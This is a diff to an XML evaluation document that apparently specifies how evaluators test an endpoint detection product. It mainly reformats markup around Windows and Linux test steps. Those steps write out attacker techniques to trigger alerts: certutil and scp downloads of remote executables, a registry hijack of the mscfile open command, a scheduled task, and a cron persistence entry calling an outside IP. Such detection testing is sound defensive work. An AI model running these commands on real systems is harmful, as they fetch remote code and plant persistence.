@@ -408,9 +408,10 @@ This section describes any modifications that the ST author must make to the Bas
                 <h:p/>
               </Guidance>
               <Tests>
-                <h:p>The evaluator shall perform the following tests:</h:p>
+                The evaluator shall perform the following tests:
                 <testlist>
-                  <h:p><h:b>For Windows,</h:b> the evaluator shall test the EDR's ability to detect anomalous activity by performing the following subtests based on the platform of the enrolled Host Agent's system, verifying for each that, corresponding alerts were generated in the management dashboard:</h:p>
+                  <h:b>For Windows,</h:b>
+                  the evaluator shall test the EDR's ability to detect anomalous activity by performing the following subtests based on the platform of the enrolled Host Agent's system, verifying for each that, corresponding alerts were generated in the management dashboard:
                   <test>The evaluator shall open a Windows command prompt as a user and run the command <h:code>cmd /c certutil -urlcache -split -f &lt;remote file>
                         &lt;download directory></h:code>, where the remote file is a valid file path to an accessible, remotely stored executable, and the download directory is a valid directory path writable by the current local user.</test>
                   <test>The evaluator shall open a Windows command prompt as a user and run the command <h:code>reg.exe add hkcu\software\classes\mscfile\shell\open\command
@@ -419,7 +420,8 @@ This section describes any modifications that the ST author must make to the Bas
                         executable>" /ST &lt;time></h:code>, where the local executable is a valid file path to a readable, local executable, and time is a start time that occurs within minutes of the task being created.</test>
                 </testlist>
                 <testlist>
-                  <h:p><h:b>For Linux,</h:b> the evaluator shall test the EDR's ability to detect anomalous activity by performing the following subtests based on the platform of the enrolled Host Agent's system, verifying for each that, corresponding alerts were generated in the management dashboard:</h:p>
+                  <h:b>For Linux,</h:b>
+                  the evaluator shall test the EDR's ability to detect anomalous activity by performing the following subtests based on the platform of the enrolled Host Agent's system, verifying for each that, corresponding alerts were generated in the management dashboard:
                   <test>The evaluator shall open a terminal and run the command <h:code>scp
                       &lt;remote user>@&lt;remote host>:&lt;remote path>
                       &lt;download directory></h:code>, where the remote user is a valid user on remote host, remote path is a valid path to a remotely stored executable, and the download directory is a valid directory path writable by the current local user. The remote user's password shall be provided when prompted.</test>
@@ -428,9 +430,7 @@ This section describes any modifications that the ST author must make to the Bas
                       /etc/cron.hourly/persist</h:code>, where the outside IP is a valid external address.</test>
                 </testlist>
                 <testlist>
-                  <h:p>
-                    <h:b>For all platforms:</h:b>
-                  </h:p>
+                  <h:b>For all platforms:</h:b>
                   <test>The evaluator shall review an alert on the management dashboard and verify that the alert contains a severity field and the fields specified in the ST. The evaluator will open or view the alert and verify that a timeline of events is available for review. The timeline shall show a progression of events over time.</test>
                   <test>The evaluator shall pick an alert on the management dashboard and export the alert in every format specified in the ST. The evaluator shall review the operational guidance and the selection from the requirement and verify that export options exist for all the declared formats in the selection. After exporting one alert for each possible format the evaluator shall review the file contents of the exported alert and verify it is the correct format for the selected export option (for example, an export of the IODEF type must contain 'IODEF-Document' in the first element of the exported file).</test>
                 </testlist>
